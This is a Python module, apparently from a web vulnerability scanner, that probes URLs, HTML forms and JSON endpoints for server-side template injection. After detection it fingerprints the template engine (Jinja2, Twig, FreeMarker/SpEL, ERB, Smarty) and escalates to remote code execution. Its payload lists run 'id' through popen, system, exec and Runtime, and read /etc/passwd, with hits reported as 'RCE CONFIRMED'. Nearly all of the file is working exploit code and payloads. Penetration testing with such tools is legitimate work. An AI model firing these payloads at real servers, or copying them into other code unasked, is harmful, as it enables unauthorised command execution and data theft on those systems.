import requests
import random
from parametizer.bounded_pool import run_threadpool_pending_bounded
from urllib.parse import urlparse, parse_qs, urljoin, quote
from bs4 import BeautifulSoup
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import urllib3
import threading
import sys
import os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Campos JSON comunes para probar en endpoints sin query params
_JSON_COMMON_FIELDS: list = [
    "comment", "message", "text", "content", "body", "input",
    "q", "query", "search", "name", "value", "data",
    "email", "username", "user", "param", "template",
]

# Cache para detección de endpoints que aceptan JSON
_json_accept_cache: dict = {}
_json_accept_lock = threading.Lock()


def _probe_accepts_json(base_url: str, headers: dict) -> bool:
    """Detecta si el endpoint acepta Content-Type: application/json (respuesta != 415)."""
    with _json_accept_lock:
        if base_url in _json_accept_cache:
            return _json_accept_cache[base_url]
    try:
        h = dict(headers)
        h["Content-Type"] = "application/json"
        r = requests.post(base_url, json={}, headers=h, verify=False, timeout=4)
        accepts = r.status_code != 415
    except Exception:
        accepts = False
    with _json_accept_lock:
        _json_accept_cache[base_url] = accepts
    return accepts


# ---------------------------------------------------------------------------
# ENGINE FINGERPRINTING Y ESCALACIÓN PARA SSTI
# ---------------------------------------------------------------------------

# Mapa: payload de prueba → engine que lo evalúa
_SSTI_ENGINE_PROBES: list = [
    # (payload, resultado_esperado, engine_candidato)
    ("{{7*7}}",     "49",       "jinja2_or_twig"),
    ("${7*7}",      "49",       "freemarker_or_spel"),
    ("#{7*7}",      "49",       "erb_or_groovy"),
    ("<%=7*7%>",    "49",       "erb_asp"),
    ("{7*7}",       "49",       "smarty"),
    # Disambiguation Jinja2 vs Twig
    ("{{7*'7'}}",   "7777777",  "twig"),
    ("{{7*'7'}}",   "49",       "jinja2"),
]

# Payloads de escalación RCE por engine (ejecutan `id` en Linux o `whoami` en Windows)
_SSTI_ESCALATION_PAYLOADS: dict = {
    "jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{%for x in ().__class__.__base__.__subclasses__()%}{%if x.__name__=='Popen'%}{{x(['id'],stdout=-1).communicate()[0]}}{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.get('PATH')}}",
    ],
    "freemarker_or_spel": [
        "${\"freemarker.template.utility.Execute\"?new()('id')}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "erb_or_groovy": [
        "<%= `id` %>",
        "<%= system('id') %>",
        "<%= File.read('/etc/passwd') %>",
    ],
    "erb_asp": [
        "<%=`id`%>",
        "<%=IO.read('/etc/passwd')%>",
    ],
    "smarty": [
        "{php}echo `id`;{/php}",
        "{system('id')}",
        "{php}system('id');{/php}",
    ],
}

# Indicadores de output de id/whoami para confirmar RCE via SSTI
_SSTI_RCE_INDICATORS: list = [
    "uid=", "gid=", "groups=",
    "root", "www-data", "apache",
    "root:x:0:0:",
]


def _ssti_fingerprint_engine(base_url: str, param: str, method: str,
                               headers: dict) -> str:
    """
    Determina el template engine enviando probes de disambiguation.
    Retorna el nombre del engine ('jinja2', 'twig', 'freemarker_or_spel',
    'erb_or_groovy', 'erb_asp', 'smarty') o 'unknown'.
    Solo se llama cuando ya se confirmó SSTI con 2+ verification_payloads.
    """
    for probe, expected, engine in _SSTI_ENGINE_PROBES:
        try:
            if method == "get":
                r = requests.get(base_url, params={param: probe}, headers=headers, verify=False, timeout=5)
            else:
                r = requests.post(base_url, data={param: probe}, headers=headers, verify=False, timeout=5)
            if r.status_code == 200 and expected in r.text:
                return engine
        except Exception:
            continue
    return "unknown"


def _ssti_try_rce(base_url: str, param: str, method: str,
                   headers: dict, engine: str) -> tuple:
    """
    Intenta escalar SSTI a RCE con payloads específicos del engine detectado.
    Retorna (True, payload, output) si hay output de comando reconocible.
    """
    escalation_list = _SSTI_ESCALATION_PAYLOADS.get(engine, [])
    if engine == "unknown":
        # Si no se identificó el engine, probar todos
        escalation_list = [p for pl in _SSTI_ESCALATION_PAYLOADS.values() for p in pl[:1]]

    for ep in escalation_list[:3]:  # Máx 3 por engine
        try:
            if method == "get":
                r = requests.get(base_url, params={param: ep}, headers=headers, verify=False, timeout=5)
            else:
                r = requests.post(base_url, data={param: ep}, headers=headers, verify=False, timeout=5)
            if r.status_code == 200:
                for indicator in _SSTI_RCE_INDICATORS:
                    if indicator in r.text:
                        idx = r.text.find(indicator)
                        snippet = r.text[max(0, idx - 20):idx + 80].strip()
                        return True, ep, snippet
        except Exception:
            continue
    return False, "", ""


def is_ssti_response(text, payload=None):
    """
    Función ULTRA ESTRICTA para detectar SOLO vulnerabilidades SSTI REALES
    """
    if not isinstance(text, str) or len(text.strip()) == 0:
        return False
    
    # Normalizar una sola vez
    lowered_text = text.lower()
    
    # EXCLUSIONES INMEDIATAS - Si contiene estos, NO es SSTI
    exclusion_patterns = [
        # Errores de SQL
        "sql syntax", "mysql", "unknown column", "where clause", "check the manual",
        "you have an error in your sql syntax", "error in your sql",
        # Errores de sintaxis general
        "syntax error", "parse error", "compilation error",
        # Respuestas HTML estáticas comunes
        "tumblr", "facebook", "twitter", "instagram", "youtube", "google",
        # Errores de servidor web
        "apache", "nginx", "iis", "server error", "internal server error",
        # Errores de aplicación
        "application error", "runtime error", "fatal error"
    ]
    
    # Si contiene cualquier patrón de exclusión, NO es SSTI
    if any(pattern in lowered_text for pattern in exclusion_patterns):
        return False
    
    # EXCLUSIONES POR CONTEXTO - Si es HTML estático, NO es SSTI
    html_static_indicators = [
        "<!doctype html>", "<html", "<head>", "<body>", "<meta", "<script",
        "tumblr.com", "assets.tumblr.com", "static.tumblr.com"
    ]
    
    # Si es claramente HTML estático de Tumblr, NO es SSTI
    if any(indicator in lowered_text for indicator in html_static_indicators):
        return False
    
    # EVIDENCIA FUERTE 1: Resultados matemáticos específicos de SSTI
    # Solo aceptar si están en contexto apropiado (no en URLs o metadatos)
    math_results = ["49", "14", "21", "28", "35", "42", "56", "63", "70", "77", "84", "91", "98"]
    for result in math_results:
        if result in text:
            # Verificar que no esté en una URL o metadato
            if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                return True
    
    # EVIDENCIA FUERTE 2: Contenido de archivos del sistema real
    system_file_indicators = [
        "root:x:0:0:", "bin:x:1:1:", "daemon:x:2:2:", "sys:x:3:3:",
        "total ", "drwxr-xr-x", "-rw-r--r--", "lrwxrwxrwx",
        "proc/", "sys/", "dev/", "etc/", "var/", "usr/", "home/"
    ]
    
    for indicator in system_file_indicators:
        if indicator in text:
            # Verificar que no esté en una URL o metadato
            if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                return True
    
    # EVIDENCIA MEDIA: Errores específicos de motores de template
    # Solo si NO hay errores de SQL y está en contexto apropiado
    engine_error_indicators = [
        "jinja2.exceptions", "templatesyntaxerror", "undefinederror",
        "twig.error", "freemarker.core", "templateexception",
        "org.apache.velocity", "velocityexception", "mako.exceptions",
        "thymeleaf", "pebble", "mustache", "handlebars"
    ]
    
    for indicator in engine_error_indicators:
        if indicator in lowered_text:
            # Verificar que no sea un error de SQL disfrazado
            if "sql" not in lowered_text and "mysql" not in lowered_text:
                # Verificar que no esté en una URL o metadato
                if not any(url_indicator in lowered_text for url_indicator in ["http://", "https://", "url=", "src="]):
                    return True
    
    # EVIDENCIA DÉBIL: Reflexión de payload con contexto
    # Solo si hay evidencia de que se está procesando como template
    if payload:
        try:
            from urllib.parse import quote, unquote
            payload_variants = set([
                payload,
                payload.strip(),
                quote(payload, safe=''),
                unquote(payload),
            ])
        except Exception:
            payload_variants = set([payload, payload.strip()])
        
        # Verificar si el payload se refleja
        payload_reflected = any(variant in text for variant in payload_variants)
        
        if payload_reflected:
            # Indicadores de que se está procesando como template
            template_processing_indicators = [
                "template", "render", "compile", "parse", "execute",
                "jinja", "twig", "freemarker", "velocity", "mako"
            ]
            
            # Si hay indicadores de procesamiento de template, podría ser SSTI
            if any(indicator in lowered_text for indicator in template_processing_indicators):
                return True
            
            # Si NO hay indicadores de procesamiento de template, es solo reflexión
            return False
    
    # VERIFICACIÓN FINAL: Solo retornar True si hay evidencia fuerte
    # Si no hay resultados matemáticos, contenido de archivos del sistema, 
    # o errores de template en contexto apropiado, NO es SSTI
    return False

def ssti(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False, strict_mode=True):
    sys.stdout.write('\033[1;36m<<<<<<<<<<<<\033[0m Testing SSTI Injection \033[1;36m>>>>>>>>>>>>>>\033[0m\n')
    print()
    sys.stdout.flush()

    total_tasks = (len(urip) * 3 + len(urif) * 2) * len(wordlist)  # GET+POST+JSON (urip) + FORM+JSON (urif)
    current = 0
    lock = threading.Lock()
    vulnerable_endpoints = set()
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()

    try:
        from scanners.ban_detector import get_ban_detector
    except ImportError:
        from ban_detector import get_ban_detector
    ban = get_ban_detector()
    
    # Payloads de verificación OBLIGATORIOS para confirmar SSTI real
    verification_payloads = [
        "{{7*7}}",      # Jinja2/Twig - debe devolver 49
        "${7*7}",       # Freemarker - debe devolver 49
        "#{7*7}",       # Ruby ERB - debe devolver 49
        "<%=7*7%>",     # PHP/ASP - debe devolver 49
        "{7*7}",        # Handlebars - debe devolver 49
        "{{7*7}}",      # Mustache - debe devolver 49
    ]
    
    # Payloads de verificación adicionales para diferentes motores
    file_read_payloads = [
        "{{config}}",           # Jinja2 config
        "${class.getClassLoader()}",  # Freemarker
        "#{Dir.entries('/')}",  # Ruby ERB
        "<%=Dir.entries('/')%>", # PHP/ASP
    ]
    
    def verify_ssti_vulnerability(base_url, param, method, headers, payload):
        """
        Verificar que una vulnerabilidad SSTI sea REAL usando múltiples payloads.
        Retorna (is_vulnerable, successful_payloads, engine, rce_achieved, rce_output).
        """
        verification_count = 0
        successful_payloads = []

        for verify_payload in verification_payloads[:4]:
            try:
                if method == "get":
                    verify_r = requests.get(base_url, params={param: verify_payload}, headers=headers, verify=False, timeout=5)
                else:
                    verify_r = requests.post(base_url, data={param: verify_payload}, headers=headers, verify=False, timeout=5)

                if verify_r.status_code == 200 and is_ssti_response(verify_r.text, verify_payload):
                    verification_count += 1
                    successful_payloads.append(verify_payload)
                    if verification_count >= 2:
                        break
            except Exception:
                continue

        if verification_count < 2:
            return False, successful_payloads, "unknown", False, ""

        # Fingerprinting del engine
        engine = _ssti_fingerprint_engine(base_url, param, method, headers)

        # Intentar escalación a RCE
        rce_ok, rce_payload, rce_output = _ssti_try_rce(base_url, param, method, headers, engine)

        return True, successful_payloads, engine, rce_ok, rce_output
    

    def get_baseline_response(method, url, data=None):      
        try:
            # Solo hacer request si hay datos, sino retornar string vacío
            if not data:
                return ""
                
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            if method == "post":
                r = requests.post(url, data={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            elif method == "get":
                r = requests.get(url, params={k: "TEST123" for k in data}, headers=headers, verify=False, timeout=5)
            else:
                return ""
            
            # Solo retornar texto si la respuesta es exitosa
            if r.status_code == 200:
                return r.text.lower()
            return ""
        except requests.exceptions.Timeout:
            return ""  # Timeout específico
        except requests.exceptions.RequestException:
            return ""  # Otros errores de requests
        except Exception:
            return ""  # Cualquier otro error

    def test_url(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if not qs:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        # Verificar si ya se explotó esta URL usando el sistema unificado
        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            # Verificar si ya se explotó esta combinación específica
            if vuln_manager.should_skip_url(base_url, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return
                
            # Cache de baseline para GET
            baseline_key = f"GET-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("get", base_url, {param: "TEST123"})
            baseline = baseline_cache[baseline_key]
            
            # Verificar si el parámetro se refleja
            if not baseline or "test123" not in baseline:
                continue

            # Ahora prueba con payload SSTI
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            if ban.is_banned(parsed.netloc):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            try:
                r = requests.get(base_url, params={param: payload}, headers=headers, verify=False, timeout=5)
                ban.record(parsed.netloc, r.status_code, r, base_url)

                # Solo procesar si la respuesta es exitosa
                if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
                    is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
                        verify_ssti_vulnerability(base_url, param, "get", headers, payload)

                    if not is_vulnerable:
                        continue

                    if not vuln_manager.is_already_exploited(base_url, param):
                        if not vuln_manager.verify_false_positive(base_url, payload, "GET", custom_headers, random_agent):
                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
                                rce_label = f" \033[1;31m[RCE CONFIRMED: {rce_output[:60]}]\033[0m" if rce_ok else ""
                                print_vulnerability(
                                    f"\033[1;32m[GET][SSTI][{engine_label}]\033[0m "
                                    f"{base_url}?{param}={encoded}{rce_label}"
                                )
                            entry = f"{base_url}?{param}={quote(payload, safe='')}"
                            entry += f"|||SSTI_ENGINE:{engine}"
                            if rce_ok:
                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
                            urls_vulnerables.append(entry)
                    break
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_post(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if base_url in vulnerable_endpoints or not qs:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in qs:
            # Cache de baseline para POST
            baseline_key = f"POST-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                baseline_cache[baseline_key] = get_baseline_response("post", base_url, {param: "TEST123"})
            baseline = baseline_cache[baseline_key]
            
            # Verificar si el parámetro se refleja
            if not baseline or "test123" not in baseline:
                continue

            # Prueba payload SSTI
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            try:
                r = requests.post(base_url, data={param: payload}, headers=headers, verify=False, timeout=5)
                
                # Solo procesar si la respuesta es exitosa
                if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
                    is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
                        verify_ssti_vulnerability(base_url, param, "post", headers, payload)

                    if not is_vulnerable:
                        continue

                    with lock:
                        if base_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(base_url)
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
                                rce_label = f" \033[1;31m[RCE CONFIRMED: {rce_output[:60]}]\033[0m" if rce_ok else ""
                                print_vulnerability(
                                    f"\033[1;32m[POST][SSTI][{engine_label}]\033[0m "
                                    f"{base_url}?{param}={encoded}{rce_label}"
                                )
                            entry = f"{base_url}?{param}={quote(payload, safe='')}"
                            entry += f"|||SSTI_ENGINE:{engine}"
                            if rce_ok:
                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
                            urls_vulnerables.append(entry)
                    break
            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_form(url, payload):
        nonlocal current
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
        try:
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = requests.get(url, headers=headers, timeout=7)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                form_cache[url] = forms
            else:
                forms = form_cache[url]
                
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                data = {}
                for i in inputs:
                    name = i.get("name")
                    if name:
                        # Prueba con TEST123 antes de SSTI
                        data[name] = "TEST123"

                if not data:
                    continue

                full_url = urljoin(url, action) if action else url
                
                # Cache de baseline para formularios
                baseline_key = f"{method}-{full_url}-{','.join(data.keys())}"
                if baseline_key not in baseline_cache:
                    baseline_cache[baseline_key] = get_baseline_response(method, full_url, data)
                baseline = baseline_cache[baseline_key]
                
                # Verificar si TEST123 se refleja
                if not baseline or "test123" not in baseline:
                    continue

                # Cambiar a payload real
                data = {k: payload for k in data.keys()}
                
                if method == "post":
                    res = requests.post(full_url, data=data, headers=headers, timeout=5)
                else:
                    res = requests.get(full_url, params=data, headers=headers, timeout=5)

                # Solo procesar si la respuesta es exitosa
                if res.status_code == 200 and is_ssti_response(res.text, payload) and res.text.lower() != baseline:
                    first_param = list(data.keys())[0] if data else None
                    if first_param:
                        is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
                            verify_ssti_vulnerability(full_url, first_param, method, headers, payload)
                        if not is_vulnerable:
                            continue
                    else:
                        engine, rce_ok, rce_output = "unknown", False, ""

                    with lock:
                        if full_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(full_url)
                            with stdout_lock:
                                encoded_data = {k: quote(v, safe='') for k, v in data.items()}
                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
                                rce_label = f" [RCE CONFIRMED: {rce_output[:60]}]" if rce_ok else ""
                                print_vulnerability(
                                    f"\033[1;32m[FORM][SSTI][{engine_label}]\033[0m "
                                    f"{full_url}{rce_label}\n{encoded_data}"
                                )
                            entry = f"{full_url}"
                            entry += f"|||SSTI_ENGINE:{engine}"
                            if rce_ok:
                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
                            urls_vulnerables.append(entry)
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors
            
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_json_ssti(url, payload):
        """Prueba SSTI vía JSON body. Soporta endpoints con y sin query params."""
        nonlocal current
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

        if not _probe_accepts_json(base_url, headers):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        if ban.is_banned(parsed.netloc):
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        json_headers = dict(headers)
        json_headers["Content-Type"] = "application/json"

        fields_to_test = list(qs.keys()) if qs else _JSON_COMMON_FIELDS

        for param in fields_to_test:
            if vuln_manager.should_skip_url(base_url, param):
                continue

            # Baseline: verificar que TEST123 se refleje en la respuesta JSON
            baseline_key = f"JSON-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                try:
                    rb = requests.post(base_url, json={param: "TEST123"}, headers=json_headers,
                                       verify=False, timeout=5)
                    baseline_cache[baseline_key] = rb.text.lower() if rb.status_code == 200 else ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            baseline = baseline_cache[baseline_key]

            if not baseline or "test123" not in baseline:
                continue

            try:
                r = requests.post(base_url, json={param: payload}, headers=json_headers,
                                  verify=False, timeout=5)
                ban.record(parsed.netloc, r.status_code, r, base_url)

                if r.status_code == 200 and is_ssti_response(r.text, payload) and r.text.lower() != baseline:
                    is_vulnerable, successful_payloads, engine, rce_ok, rce_output = \
                        verify_ssti_vulnerability(base_url, param, "post", headers, payload)

                    if not is_vulnerable:
                        continue

                    with lock:
                        if base_url not in vulnerable_endpoints:
                            vulnerable_endpoints.add(base_url)
                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                encoded = quote(payload, safe='')
                                engine_label = f"engine:{engine}" if engine != "unknown" else "engine:unknown"
                                rce_label = f" \033[1;31m[RCE CONFIRMED: {rce_output[:60]}]\033[0m" if rce_ok else ""
                                print_vulnerability(
                                    f"\033[1;32m[JSON-POST][SSTI][{engine_label}]\033[0m "
                                    f"{base_url} \033[2m(field: {param})\033[0m{rce_label}"
                                )
                            entry = f"{base_url}?{param}={encoded}|||JSON_BODY:true|||SSTI_ENGINE:{engine}"
                            if rce_ok:
                                entry += f"|||SSTI_RCE:{quote(rce_output[:120], safe='')}"
                            urls_vulnerables.append(entry)
                    break

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue

        with lock:
            current += 1
            update_progress(current, total_tasks)

    # Crear tareas de manera más eficiente
    def _iter_ssti_tasks():
        for url in urip:
            for payload in wordlist:
                yield (test_url, url, payload)
                yield (test_post, url, payload)
                yield (test_json_ssti, url, payload)
        for url in urif:
            for payload in wordlist:
                yield (test_form, url, payload)
                yield (test_json_ssti, url, payload)

    run_threadpool_pending_bounded(_iter_ssti_tasks(), threads)

    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    print()
    if vulnerable_endpoints:
        sys.stdout.write(f'\033[1;36m[+] Found {len(vulnerable_endpoints)} potential SSTI vulnerabilities\033[0m\n')
        sys.stdout.flush()
    else:
        sys.stdout.write('\033[1;31m[-] No SSTI vulnerabilities found\033[0m\n')
        sys.stdout.flush()
    print()
    
    return urls_vulnerables
